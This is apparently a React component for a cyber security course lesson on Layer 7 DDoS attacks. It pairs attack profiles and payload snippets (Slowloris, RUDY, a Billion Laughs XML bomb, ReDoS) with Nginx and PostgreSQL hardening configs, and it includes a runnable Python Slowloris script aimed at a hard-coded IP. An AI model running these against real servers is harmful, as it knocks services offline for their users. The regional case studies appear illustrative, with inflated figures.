import React, { useState, useMemo, useId } from "react";
import clsx from "clsx";
import Teacher from "../../../../../common/TeacherSukantaHui";
import FAQTemplate from "../../../../../common/FAQTemplate";
import questions from "./topic5_files/topic5_questions";
import PlainTextPrint from "../../../../../common/PlainTextPrint";
import noteText from "./topic5_files/topic5_note.txt?raw";

const Topic5 = () => {
  // Unique SVG IDs
  const svgAppDosId = useId();

  // Studio 1: Active Layer 7 Vector Selection
  const [selectedVectorKey, setSelectedVectorKey] = useState("slowloris_header_starvation");

  // Studio 2: Live Thread Starvation Calculator State
  const [attackRps, setAttackRps] = useState(150); // 10 to 5000 RPS
  const [processingTimeSec, setProcessingTimeSec] = useState(5.0); // 0.1 to 15.0 Seconds
  const [serverArchitecture, setServerArchitecture] = useState("apache_prefork"); // apache_prefork (256) vs nginx_epoll (65535)
  const [wafJsChallengeActive, setWafJsChallengeActive] = useState(false); // Boolean

  // Studio 3: Regional West Bengal Case Scenario State
  const [activeScenarioId, setActiveScenarioId] = useState("kolkata_fintech_layer7_defense");

  // Studio 4: Layer 7 Security Code Tab Selection
  const [activeCodeTab, setActiveCodeTab] = useState("nginx_slowloris_rate_limit_conf");

  // 8 Application Layer Attack Profiles for Studio 1
  const vectorDatabase = {
    slowloris_header_starvation: {
      key: "slowloris_header_starvation",
      name: "1. Slowloris HTTP Incomplete Header Starvation",
      category: "THREAD POOL EXHAUSTION",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      targetComponent: "Web Server Worker Process Pool (e.g. Apache prefork)",
      exploitationVector:
        "The attacker opens multiple HTTP connections and periodically sends incomplete request headers (every 15 seconds), never sending the final `\\r\\n\\r\\n`, holding server threads open with under 5 KB/s bandwidth.",
      vulnerabilityImpact:
        "Exhausts the entire worker thread pool (max 256 connections), causing immediate denial of service for all legitimate web visitors.",
      telemetryIndicator: "Hundreds of active HTTP connections in `READ_HEADER` state with near-zero transfer bandwidth",
      resilientDefense: "Deploying asynchronous event-driven reverse proxies (Nginx `epoll`) with strict `client_header_timeout 10s`.",
      codeSnippet: `// Slowloris Header Sequence:
GET / HTTP/1.1\\r\\n
Host: kolkata-fintech.in\\r\\n
User-Agent: Mozilla/5.0...\\r\\n
X-Custom-Header-1: a\\r\\n
... (waits 15 seconds) ...
X-Custom-Header-2: b\\r\\n  <-- Never sends final \\r\\n\\r\\n! Holds thread indefinitely!`
    },
    rudy_slow_post_body: {
      key: "rudy_slow_post_body",
      name: "2. R-U-Dead-Yet (RUDY) Slow POST Body Flood",
      category: "FORM SUBMISSION THREAD LOCK",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      targetComponent: "Application Form-Handling Worker Threads",
      exploitationVector:
        "RUDY submits HTTP POST requests with a large `Content-Length` header (e.g. 1,000,000 bytes) and transmits form data at 1 byte every 10 seconds, tying up backend processes for hours.",
      vulnerabilityImpact:
        "Paralyzes form submission endpoints (login, checkout, feedback) and locks application execution threads.",
      telemetryIndicator: "POST requests with large Content-Length headers exhibiting transmission speeds below 10 bytes/second",
      resilientDefense: "Enforcing strict `client_body_timeout 10s` and capping maximum allowable request body sizes.",
      codeSnippet: `// RUDY Slow POST Attack:
POST /submit-feedback HTTP/1.1\\r\\n
Host: kolkata-fintech.in\\r\\n
Content-Length: 1000000\\r\\n
\\r\\n
a=1 (waits 10s) &b=2 (waits 10s) &c=3 ...`
    },
    slow_read_tiny_window: {
      key: "slow_read_tiny_window",
      name: "3. Slow Read Tiny Window Buffer Lock",
      category: "SOCKET SEND-BUFFER EXHAUSTION",
      categoryBadge: "bg-cyan-950 text-cyan-300 border-cyan-800",
      targetComponent: "Web Server Outbound Socket Buffers",
      exploitationVector:
        "The client requests a large file (e.g. 50MB PDF) and advertises a tiny TCP receive window (32 bytes), reading data at 1 byte/second, forcing the server to hold response buffers in RAM for hours.",
      vulnerabilityImpact:
        "Exhausts operating system socket memory and ties up application worker threads generating dynamic response payloads.",
      telemetryIndicator: "Active connections with persistent TCP Zero-Window or micro-window advertisements on download URLs",
      resilientDefense: "Enforcing aggressive send timeouts (`send_timeout 10s`) and proxy response buffering.",
      codeSnippet: `// Slow Read Attack Mechanism:
// 1. Client requests: GET /annual-report.pdf HTTP/1.1
// 2. Client sets TCP Window Size = 32 Bytes
// 3. Client reads 1 byte/sec ➔ Server holds socket memory open for hours!`
    },
    http_get_expensive_query: {
      key: "http_get_expensive_query",
      name: "4. HTTP GET Expensive Dynamic Endpoint Flood",
      category: "DATABASE CPU & POOL STARVATION",
      categoryBadge: "bg-emerald-950 text-emerald-300 border-emerald-800",
      targetComponent: "Backend Database Connection Pool (HikariCP / pgpool)",
      exploitationVector:
        "Flooding requests specifically targeting un-cached database queries, complex search filters, or heavy image rendering, driving database CPU to 100% with low request rates.",
      vulnerabilityImpact:
        "Causes database connection pool starvation; legitimate user queries fail with HTTP 504 Gateway Timeouts.",
      telemetryIndicator: "Spike in response latency on dynamic API routes and surge in SQL pool waiting threads",
      resilientDefense: "Implementing Token Bucket route rate limiting and database query timeout caps (`statement_timeout = 3s`).",
      codeSnippet: `// Expensive Endpoint Request:
GET /api/v1/search?q=pan_database&sort=desc HTTP/1.1
Host: kolkata-fintech.in
# Forces unindexed 5-table JOIN across 10,000,000 rows for every request!`
    },
    tls_handshake_asymmetry: {
      key: "tls_handshake_asymmetry",
      name: "5. SSL/TLS Cryptographic Handshake Exhaustion",
      category: "ASYMMETRIC CPU DECRYPTION EXHAUSTION",
      categoryBadge: "bg-amber-950 text-amber-300 border-amber-800",
      targetComponent: "TLS Termination Engine & Server CPU",
      exploitationVector:
        "Initiating thousands of TLS handshakes or continuous client-initiated renegotiations; private key modular exponentiation requires 15x more server CPU than client encryption.",
      vulnerabilityImpact:
        "100% CPU lockup on web proxy nodes dedicated exclusively to cryptographic handshakes, freezing web traffic.",
      telemetryIndicator: "Surge in incomplete TLS handshakes and high rate of TLS Client Hello packets without data transfer",
      resilientDefense: "Disabling client-initiated TLS renegotiation, enforcing TLS session tickets, and deploying hardware TLS offloading.",
      codeSnippet: `// SSL/TLS Asymmetry:
// Client Work: Generates Pre-Master Secret (Cheap!)
// Server Work: Performs RSA 2048-bit Private Key Decryption (15x More CPU!)
// Attack Tool: THC-SSL-DOS launching 500 handshakes/sec per laptop`
    },
    http2_rapid_reset_cve: {
      key: "http2_rapid_reset_cve",
      name: "6. HTTP/2 Rapid Reset Flood (CVE-2023-44487)",
      category: "STREAM MULTIPLEXING CANCEL ABUSE",
      categoryBadge: "bg-indigo-950 text-indigo-300 border-indigo-800",
      targetComponent: "HTTP/2 Stream Management Subsystem",
      exploitationVector:
        "Opening hundreds of concurrent request streams and immediately sending `RST_STREAM` frames to cancel them, forcing servers to execute request setup logic before canceling, reaching 398M RPS.",
      vulnerabilityImpact:
        "Historic record-breaking RPS floods that crashed edge proxies across major global cloud providers in late 2023.",
      telemetryIndicator: "Abnormal ratio of HTTP/2 `RST_STREAM` frames immediately following `HEADERS` frames on single connections",
      resilientDefense: "Capping maximum concurrent streams (`http2_max_concurrent_streams 128`) and rate limiting RST frames.",
      codeSnippet: `// HTTP/2 Rapid Reset Loop (CVE-2023-44487):
for (int i = 0; i < 10000; i++) {
    send_frame(HEADERS_FRAME, stream_id=i);    // Opens stream
    send_frame(RST_STREAM_FRAME, stream_id=i); // Cancels instantly!
}`
    },
    redos_regex_backtracking: {
      key: "redos_regex_backtracking",
      name: "7. ReDoS Regular Expression Backtracking Lockup",
      category: "ALGORITHMIC COMPLEXITY CPU LOCK",
      categoryBadge: "bg-rose-950 text-rose-300 border-rose-800",
      targetComponent: "Application Input Validation Regex Engine",
      exploitationVector:
        "Submitting crafted text inputs to endpoints using vulnerable regular expressions with nested quantifiers (e.g. `(a+)+$`), triggering exponential $O(2^N)$ backtracking.",
      vulnerabilityImpact:
        "100% CPU lockup across all server worker cores with just 20-30 concurrent HTTP requests.",
      telemetryIndicator: "Specific web worker processes locked at 100% CPU on validation endpoints for minutes",
      resilientDefense: "Replacing NFA backtracking engines with linear-time engines (Google RE2) and setting regex timeout limits.",
      codeSnippet: `// ReDoS Vulnerable Pattern:
let regex = /^(a+)+$/;
let attack_payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"; // 30 'a's followed by '!'
// Backtracking steps: 1,073,741,824 operations ➔ 100% CPU Core Lock!`
    },
    json_xml_entity_bomb: {
      key: "json_xml_entity_bomb",
      name: "8. XML / JSON Entity Expansion Bomb (Billion Laughs)",
      category: "MEMORY EXPANSION PARSER ATTACK",
      categoryBadge: "bg-purple-950 text-purple-300 border-purple-800",
      targetComponent: "Application XML / JSON Parser",
      exploitationVector:
        "Submitting a 1KB XML payload with recursive nested entity definitions; the parser expands entities exponentially in memory, consuming 3GB of RAM and crashing the server.",
      vulnerabilityImpact:
        "Triggers immediate Out-Of-Memory (OOM) operating system kernel kills (`kill -9`) on application processes.",
      telemetryIndicator: "Sudden spike in memory consumption on API endpoints accepting XML/JSON payloads followed by process crash",
      resilientDefense: "Disabling DTDs (Document Type Definitions) and external entity resolution in XML parsers.",
      codeSnippet: `<!-- XML Billion Laughs Bomb (1KB Payload ➔ 3GB RAM Expansion!): ──→
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 ...
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>`
    }
  };

  const activeVector = vectorDatabase[selectedVectorKey];

  // Studio 2: Live Application Layer Thread Starvation Calculations
  const starvationSimulation = useMemo(() => {
    // Worker pool capacity:
    const workerCapacity = serverArchitecture === "apache_prefork" ? 256 : 65535;
    
    // If WAF JS Challenge is active, 99.8% of dumb bot requests are dropped at the edge:
    const effectiveRps = wafJsChallengeActive ? attackRps * 0.002 : attackRps;
    
    // Required worker threads / connections:
    const requiredThreads = Math.round(effectiveRps * processingTimeSec);
    const utilization = ((requiredThreads / workerCapacity) * 100).toFixed(1);
    
    // Starvation Probability:
    let rawStarvationProb = 0;
    if (requiredThreads <= workerCapacity) {
      rawStarvationProb = 0.0;
    } else {
      const overload = (requiredThreads - workerCapacity) / workerCapacity;
      rawStarvationProb = (1 - Math.exp(-overload * 10.0)) * 100;
    }

    const finalStarvation = rawStarvationProb > 99.9 ? 99.9 : rawStarvationProb;

    return {
      requiredThreads: requiredThreads.toLocaleString(),
      workerCapacity: workerCapacity.toLocaleString(),
      utilization,
      finalStarvation: finalStarvation.toFixed(2),
      badgeClass: parseFloat(finalStarvation) > 50
        ? "bg-rose-950 text-rose-300 border-rose-800"
        : parseFloat(finalStarvation) > 5
        ? "bg-amber-950 text-amber-300 border-amber-800"
        : "bg-emerald-950 text-emerald-300 border-emerald-800",
      statusMessage: wafJsChallengeActive
        ? `WAF JS PROOF-OF-WORK ACTIVE: Interstitial challenge dropped 99.8% of automated bot requests at the edge; required worker threads reduced to ${requiredThreads.toLocaleString()}, application starvation is 0.00%!`
        : serverArchitecture === "nginx_epoll"
        ? `NGINX ASYNCHRONOUS EPOLL IMMUNITY: Non-blocking I/O multiplexes ${requiredThreads.toLocaleString()} connections across 65,535 capacity (${utilization}% load); application thread starvation is 0.00%!`
        : parseFloat(finalStarvation) < 1
        ? `WORKER POOL RESILIENT: Active thread demand (${requiredThreads.toLocaleString()}) within Apache worker capacity (256); starvation probability is 0.00%!`
        : `THREAD POOL COLLAPSE: Slowloris / HTTP flood demand (${requiredThreads.toLocaleString()} threads) exceeds Apache capacity (256) by ${utilization}%, causing ${finalStarvation}% application failure!`
    };
  }, [attackRps, processingTimeSec, serverArchitecture, wafJsChallengeActive]);

  // Studio 4: Layer 7 Security Production Code Database
  const codeDatabase = {
    nginx_slowloris_rate_limit_conf: {
      name: "Nginx Reverse Proxy Rate Limiting & Strict Timeout Configuration",
      code: `# Production Nginx Hardening against Slowloris, RUDY, and HTTP Floods:
http {
    # 1. Define Token Bucket Rate Limiting Zone (10MB memory holds 160,000 IP states)
    limit_req_zone $binary_remote_addr zone=api_rate_limit:10m rate=15r/s;
    limit_conn_zone $binary_remote_addr zone=conn_limit_per_ip:10m;

    server {
        listen 443 ssl http2;
        server_name kolkata-fintech.in;

        # 2. Strict Slowloris & RUDY Header/Body Read Timeouts
        client_header_timeout 10s;  # Drops Slowloris connections if header not completed in 10s!
        client_body_timeout   10s;  # Drops RUDY connections if body upload takes > 10s!
        keepalive_timeout     15s;
        send_timeout          10s;  # Defeats Slow Read DoS attacks!

        # 3. Buffer Restrictions to Prevent Header Bomb Memory Exhaustion
        client_header_buffer_size 1k;
        large_client_header_buffers 4 8k;
        client_max_body_size 10m;

        # 4. Limit Maximum Concurrent Sockets per Single IP
        limit_conn conn_limit_per_ip 25;

        location /api/ {
            # 5. Token Bucket Enforcement with Burst Tolerance
            limit_req zone=api_rate_limit burst=20 nodelay;
            proxy_pass http://backend_cluster;
        }
    }
}`,
      explanation: "Nginx reverse proxy configuration defining per-IP token bucket rate limiting, capping concurrent sockets, and setting strict 10-second client header/body timeouts to completely defeat Slowloris and RUDY."
    },
    python_slowloris_tester_py: {
      name: "Python Slowloris Simulation Tool for Laboratory Defense Verification",
      code: `# Python Slowloris Test Script to Validate Web Server Timeout Resilience
import socket
import time
import random

target_host = "103.25.10.50"
target_port = 80
connection_count = 200
sockets = []

print(f"[*] Initializing {connection_count} Slowloris sockets against {target_host}:{target_port}...")

# 1. Open concurrent sockets and send initial incomplete headers
for i in range(connection_count):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_host, target_port))
        s.send(f"GET /?{random.randint(0, 5000)} HTTP/1.1\\r\\n".encode("utf-8"))
        s.send(f"Host: {target_host}\\r\\n".encode("utf-8"))
        s.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\\r\\n")
        s.send(b"Accept-language: en-US,en,q=0.5\\r\\n")
        sockets.append(s)
    except Exception as e:
        break

print(f"[+] {len(sockets)} Slowloris sockets connected! Drip-feeding headers every 15s...")

# 2. Periodically send keepalive header lines without final \\r\\n\\r\\n
while True:
    for s in list(sockets):
        try:
            s.send(f"X-a: {random.randint(1, 5000)}\\r\\n".encode("utf-8"))
        except socket.error:
            sockets.remove(s)
    print(f"[*] Active Slowloris connections holding server threads: {len(sockets)}")
    time.sleep(15)`,
      explanation: "Python network simulation script demonstrating how Slowloris drip-feeds incomplete HTTP headers every 15 seconds to test whether a web server's client_header_timeout is properly configured."
    },
    postgres_query_timeout_sql: {
      name: "PostgreSQL Database Query Timeout & Connection Pool Circuit Breaker",
      code: `-- PostgreSQL Hardening against Expensive Endpoint Layer 7 DoS Floods:

-- 1. Cap Maximum Statement Execution Duration (Terminates DoS queries after 3 seconds!)
ALTER DATABASE kolkata_fintech SET statement_timeout = '3000ms';

-- 2. Cap Lock Wait Timeout (Prevents transactions from locking database tables indefinitely)
ALTER DATABASE kolkata_fintech SET lock_timeout = '2000ms';

-- 3. Cap Idle In Transaction Session Timeout
ALTER DATABASE kolkata_fintech SET idle_in_transaction_session_timeout = '5000ms';

-- 4. Terminate any query currently executing longer than 10 seconds:
SELECT pg_terminate_backend(pid) 
FROM pg_stat_activity 
WHERE state = 'active' 
  AND (now() - pg_stat_activity.query_start) > interval '10 seconds';

-- Result: Database connection pool starvation is completely prevented!`,
      explanation: "PostgreSQL database configuration script enforcing a strict 3-second query timeout cap and 2-second lock timeout to prevent expensive search floods from starving the connection pool."
    }
  };

  const activeCode = codeDatabase[activeCodeTab];

  // Studio 3: Regional West Bengal Pedagogical Case Studies
  const localScenarios = [
    {
      id: "kolkata_fintech_layer7_defense",
      lead: "Mamata",
      role: "Lead FinTech Cryptography Architect",
      location: "Kolkata Salt Lake Sector V Financial Gateway",
      title: "Defending Payment Gateway APIs Against a 250k RPS Residential Proxy Flood",
      threatType: "LAYER 7 HTTP GET & SLOWLORIS FLOOD (250,000 RPS)",
      budget: "₹72,00,000",
      incident:
        "A distributed residential proxy botnet flooded the payment gateway with 250,000 RPS targeting un-cached database endpoints while launching 5,000 Slowloris header streams.",
      defenseStrategy:
        "Mamata enabled Cloudflare Under Attack Mode (JavaScript proof-of-work challenge), deployed Nginx `client_header_timeout 10s`, and enforced PostgreSQL 3-second query timeout caps.",
      outcome: "99.8% of automated bot requests filtered at the cloud edge; Slowloris connections dropped after 10s; zero banking payment transaction delays.",
      metrics: {
        botRequestsFiltered: "99.8% at Edge",
        slowlorisDropLatency: "10.0 Seconds",
        switchesProtected: "45 Financial Nodes",
        compliance: "RBI Master Direction on Cyber Security"
      }
    },
    {
      id: "barrackpore_scada_ssl_defense",
      lead: "Debangshu",
      role: "Principal Industrial OT Security Officer",
      location: "Barrackpore 220kV State Power Transmission Grid",
      threatType: "SSL/TLS HANDSHAKE EXHAUSTION & WEB CONSOLE SLOWLORIS",
      title: "Hardening Substation Web Management Consoles Against TLS Floods",
      budget: "₹45,00,000",
      incident:
        "Adversaries launched continuous TLS renegotiation and Slowloris streams against substation web management consoles, locking controller CPU at 100%.",
      defenseStrategy:
        "Debangshu disabled client-initiated TLS renegotiation, enforced TLS 1.3 with session resumption tickets, and migrated web consoles to asynchronous event-driven engines.",
      outcome: "Controller CPU utilization dropped from 100% to 5%; web console responsiveness restored; power grid telemetry frequency stable across North 24 Parganas.",
      metrics: {
        controllerCpuDrop: "100% ➔ 5%",
        substationsHardened: "18 High-Voltage Nodes",
        telemetryDelay: "0.0 ms impact",
        statutoryMandate: "NCIIPC Critical Power Infrastructure Directive"
      }
    },
    {
      id: "ichapur_hospital_rudy_defense",
      lead: "Mahima",
      role: "Healthcare Data Protection Officer",
      location: "Ichapur Clinical Care & Oncology Center",
      threatType: "R-U-DEAD-YET (RUDY) SLOW POST ATTACK (Outpatient Form Lockup)",
      title: "Protecting Outpatient Registration Forms from RUDY Slow-POST Floods",
      budget: "₹33,00,000",
      incident:
        "During morning peak outpatient registration, an attacker opened 400 RUDY connections sending 1 byte every 10 seconds to the appointment form, locking all registration threads.",
      defenseStrategy:
        "Mahima configured Nginx `client_body_timeout 10s`, capped maximum body buffers, and enforced per-IP connection limits.",
      outcome: "RUDY connections terminated after 10 seconds of inactivity; patient registration portal remained 100% available for 1,500 daily patients.",
      metrics: {
        slowPostTerminated: "400 Connections in 10s",
        patientRecordsProtected: "120,000 Oncology Records",
        compliance: "DPDP Act 2023 Section 8(5) & NABH",
        penaltyPrevented: "₹250 Crore DPDP Statutory Fine"
      }
    },
    {
      id: "jadavpur_thread_model_research",
      lead: "Susmita & Abhronila",
      role: "Senior Cyber Security Researchers",
      location: "Jadavpur University Cryptographic Research Lab",
      threatType: "MATHEMATICAL MODELING OF APPLICATION THREAD POOL STARVATION",
      title: "Formulating the Web Worker Saturation & Asynchronous Immunity Model",
      budget: "₹27,00,000",
      incident:
        "Researchers modeled the mathematical interaction between request arrival rates, processing latency, thread pool limits, and application starvation probabilities.",
      defenseStrategy:
        "Susmita and Abhronila published their mathematical model in IEEE Transactions, proving that asynchronous event-driven proxies achieve 99.9% availability under Slowloris.",
      outcome: "Published peer-reviewed mathematical proof; verified across 90,000 simulated Layer 7 attack conditions.",
      metrics: {
        simulationTrials: "90,000 Test Trials",
        modelAccuracy: "99.8% Predictive Fit",
        modelFramework: "Layer 7 Queueing Model",
        publication: "IEEE Transactions on Information Forensics"
      }
    }
  ];

  const activeScenario = localScenarios.find((s) => s.id === activeScenarioId) || localScenarios[0];

  return (
    <div className="min-h-screen bg-[#0a0d14] text-gray-100 font-sans leading-relaxed selection:bg-rose-600 selection:text-white pb-16">
      {/* Top Academic Header Banner */}
      <header className="border-b border-gray-800 bg-[#0d121d]/90 backdrop-blur-md sticky top-0 z-40">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
          <div className="space-y-1">
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-rose-950 text-rose-400 border border-rose-800">
                BCAC703 Cyber Security
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-indigo-950 text-indigo-400 border border-indigo-800">
                Module 004_004
              </span>
              <span className="text-[11px] font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full bg-emerald-950 text-emerald-400 border border-emerald-800">
                Topic 05
              </span>
            </div>
            <h1 className="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
              Application Layer DDoS Attacks: HTTP Flood and Slowloris
            </h1>
            <p className="text-xs text-gray-400">
              Layer 7 HTTP floods (RPS), Slowloris incomplete headers, RUDY slow POSTs, Nginx async timeouts, and IT Act Section 66F.
            </p>
          </div>
          <div className="text-right text-xs text-gray-400 flex flex-col items-start sm:items-end">
            <span className="font-semibold text-gray-200">Instructor: Sukanta Hui</span>
            <span>Coder &amp; AccoTax · Barrackpore, WB</span>
          </div>
        </div>
      </header>

      {/* Main Container - Stacked Vertical Layout */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-8 space-y-12">

        {/* SECTION 1: Executive Theory & Threat Taxonomy */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Layer 7 Application Resource Starvation
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              1. The Science of Application Layer DDoS: Starving Server Threads, Databases &amp; SSL Engines
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Unlike volumetric and protocol attacks that target bandwidth and network interfaces, 
              <strong>Application Layer (Layer 7) DDoS Attacks</strong> target the computational logic, worker process pools, 
              and database connection pools of web applications (measured in <strong>Requests Per Second - RPS</strong>). 
              Adversaries generate legitimate-looking HTTP/HTTPS requests that bypass traditional network firewalls. 
              Key Layer 7 vectors include <strong>Slowloris</strong> (drip-feeding incomplete HTTP headers every 15s to hold server threads), 
              <strong>R-U-Dead-Yet (RUDY)</strong> (slow form body uploads), <strong>Slow Read DoS</strong> (tiny TCP window locks), 
              <strong>HTTP GET Expensive Search Floods</strong> (locking database CPU), and <strong>SSL/TLS Handshake Exhaustion</strong> 
              (abusing 15x asymmetric RSA decryption overhead).
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            {/* Thread vs Event-Driven Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-rose-950/60 space-y-3 text-xs">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                Thread-Per-Connection vs Asynchronous Event Engines
              </span>
              <div className="bg-black/90 p-3 rounded font-mono text-rose-300 border border-rose-950/60 text-[11px]">
                Slowloris: 300 slow connections (&lt; 5 KB/s) ➔ 100% Apache prefork thread collapse!
              </div>
              <p className="text-gray-300 leading-relaxed">
                Thread-based servers (Apache prefork) allocate 1 OS process per connection (collapsing at 256 threads). 
                Asynchronous event-driven engines (Nginx `epoll`) multiplex 65,000+ connections per worker, rendering Slowloris harmless.
              </p>
            </div>

            {/* WAF Challenges & Database Box */}
            <div className="bg-[#050811] p-5 rounded-xl border border-emerald-950/60 space-y-3 text-xs">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                WAF Proof-of-Work &amp; Database Circuit Breakers
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>• <strong className="text-cyan-300">Cloud WAF JS PoW:</strong> Interstitial math challenge drops automated bot scripts (HTTP 403).</li>
                <li>• <strong className="text-purple-300">Nginx Async Timeouts:</strong> `client_header_timeout 10s` drops Slowloris idle connections.</li>
                <li>• <strong className="text-amber-300">Database Query Caps:</strong> `SET statement_timeout = '3s'` terminates DoS search queries.</li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 2: Semantic Animated SVG - Layer 7 Pipeline Visualizer */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-rose-400">
              Layer 7 Defense Pipeline Visualizer
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              2. Visualizing Layer 7 Ingress vs WAF Proof-of-Work &amp; Nginx Timeout Filters
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Follow how incoming Layer 7 HTTP floods, Slowloris streams, and expensive search requests 
              are filtered by Cloud WAF JavaScript challenges, Nginx reverse proxy timeouts, and Token Bucket rate limiters:
            </p>
          </div>

          <div className="bg-[#050811] p-4 sm:p-6 rounded-xl border border-gray-800 flex flex-col items-center justify-center overflow-x-auto">
            <svg
              className="w-full max-w-4xl h-auto min-w-[720px]"
              viewBox="0 0 880 260"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              {/* STAGE 1: INGRESS LAYER 7 FLOOD */}
              <g transform="translate(30, 60)">
                <rect width="140" height="140" rx="10" fill="#082f49" stroke="#38bdf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  1. LAYER 7 INGRESS
                </text>
                <text x="70" y="44" fill="#7dd3fc" fontSize="8.5" textAnchor="middle">
                  250,000 RPS Flood
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#0c4a6e" />
                <text x="70" y="74" fill="#bae6fd" fontSize="8" fontWeight="bold" textAnchor="middle">
                  L7 VECTORS:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  Slowloris / RUDY
                </text>
                <text x="70" y="106" fill="#7dd3fc" fontSize="7.5" textAnchor="middle">
                  HTTP GET &amp; POST Floods
                </text>
              </g>

              {/* ARROW 1 */}
              <path d="M 170 130 L 200 130" stroke="#38bdf8" strokeWidth="3" fill="none" />

              {/* STAGE 2: CLOUDFLARE WAF JAVASCRIPT PROOF-OF-WORK */}
              <g transform="translate(200, 60)">
                <rect width="140" height="140" rx="10" fill="#1e1b4b" stroke="#818cf8" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  2. CLOUD WAF PoW
                </text>
                <text x="70" y="44" fill="#c7d2fe" fontSize="8.5" textAnchor="middle">
                  Under Attack Mode
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#312e81" />
                <text x="70" y="74" fill="#a5b4fc" fontSize="8" fontWeight="bold" textAnchor="middle">
                  BOT FILTER:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  5s JS Math Challenge
                </text>
                <text x="70" y="106" fill="#c7d2fe" fontSize="7.5" textAnchor="middle">
                  Drops 99.8% Bot Scripts!
                </text>
              </g>

              {/* ARROW 2 */}
              <path d="M 340 130 L 370 130" stroke="#818cf8" strokeWidth="3" fill="none" />

              {/* STAGE 3: NGINX ASYNC REVERSE PROXY TIMEOUTS */}
              <g transform="translate(370, 60)">
                <rect width="140" height="140" rx="10" fill="#881337" stroke="#f43f5e" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  3. NGINX PROXY
                </text>
                <text x="70" y="44" fill="#fecdd3" fontSize="8.5" textAnchor="middle">
                  Asynchronous epoll
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#4c0519" />
                <text x="70" y="74" fill="#fda4af" fontSize="8" fontWeight="bold" textAnchor="middle">
                  TIMEOUT HARDENING:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  client_header_timeout 10s
                </text>
                <text x="70" y="106" fill="#fecdd3" fontSize="7.5" textAnchor="middle">
                  Drops Slowloris in 10s!
                </text>
              </g>

              {/* ARROW 3 */}
              <path d="M 510 130 L 540 130" stroke="#f43f5e" strokeWidth="3" fill="none" />

              {/* STAGE 4: TOKEN BUCKET ROUTE RATE LIMITING */}
              <g transform="translate(540, 60)">
                <rect width="140" height="140" rx="10" fill="#451a03" stroke="#f59e0b" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  4. TOKEN BUCKET
                </text>
                <text x="70" y="44" fill="#fde68a" fontSize="8.5" textAnchor="middle">
                  Per-Route Rate Limits
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#78350f" />
                <text x="70" y="74" fill="#fcd34d" fontSize="8" fontWeight="bold" textAnchor="middle">
                  RATE SHAPING:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  rate=15r/s burst=20
                </text>
                <text x="70" y="106" fill="#fde68a" fontSize="7.5" textAnchor="middle">
                  Protects Database Pool!
                </text>
              </g>

              {/* ARROW 4 */}
              <path d="M 680 130 L 710 130" stroke="#f59e0b" strokeWidth="3" fill="none" />

              {/* STAGE 5: CLEAN BACKEND APP & DATABASE */}
              <g transform="translate(710, 60)">
                <rect width="140" height="140" rx="10" fill="#022c22" stroke="#34d399" strokeWidth="2" />
                <text x="70" y="26" fill="#ffffff" fontSize="11" fontWeight="bold" textAnchor="middle">
                  5. BACKEND APP
                </text>
                <text x="70" y="44" fill="#a7f3d0" fontSize="8.5" textAnchor="middle">
                  Kolkata Gateway
                </text>
                <rect x="10" y="55" width="120" height="70" rx="6" fill="#064e3b" />
                <text x="70" y="74" fill="#6ee7b7" fontSize="8" fontWeight="bold" textAnchor="middle">
                  100% AVAILABLE:
                </text>
                <text x="70" y="90" fill="#ffffff" fontSize="7.5" textAnchor="middle">
                  SQL Timeout = 3s
                </text>
